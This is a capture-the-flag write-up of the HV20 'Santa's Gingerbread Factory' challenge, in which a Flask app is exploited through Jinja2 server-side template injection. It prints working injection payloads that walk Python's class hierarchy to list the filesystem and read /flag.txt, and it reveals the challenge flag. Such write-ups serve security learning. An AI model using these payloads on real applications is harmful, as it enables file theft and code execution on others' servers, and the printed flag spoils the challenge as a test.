# Day 09 / HV20.09 Santa's Gingerbread Factory



## Challenge

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
* Author: inik
* Tags:   #penetration-testing #web-security
* Level:  medium


### Introduction

Here you can customize your absolutely fat-free gingerbread man.

Note: Start your personal instance from the `RESOURCES` section on top.


### Goal / Mission

Besides the gingerbread men, there are other goodies there. Let's see if you
can get the goodie, which is stored in /flag.txt.



## Solution

The website is a flask application and the topic is [flask injection].

[flask injection]{https://blog.nvisium.com/injecting-flask}

After a lot of trial and error that startet with a simple `{{ 4 * 4 }}` that
gets evaluated to `16`. The solution was found with

1. A file listing injection:
   
   ```python
   {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').listdir('.')}}

   Output: 
    -------------------------------
   ( Hello, mighty ['bin', 'boot', )
   ( 'dev', 'etc', 'home', 'lib',  )
   ( 'lib64', 'media', 'mnt',      )
   ( 'opt', 'proc', 'root', 'run', )
   ( 'sbin', 'srv', 'sys', 'tmp',  )
   ( 'usr', 'var', '.dockerenv',   )
   ( 'flag.txt']                   )
    -------------------------------
   ```

2. And the final injection to extract the flag:

   ```python
   {{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open'](''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__.__import__('os').path.join('.','flag.txt')).read()}}

   Output:
    --------------------------------
   ( Hello, mighty HV20{SST1_N0t_0N )
   ( LY_H1Ts_UB3R!!!}               )
    --------------------------------
   ```

--------------------------------------------------------------------------------

Flag: `HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}`

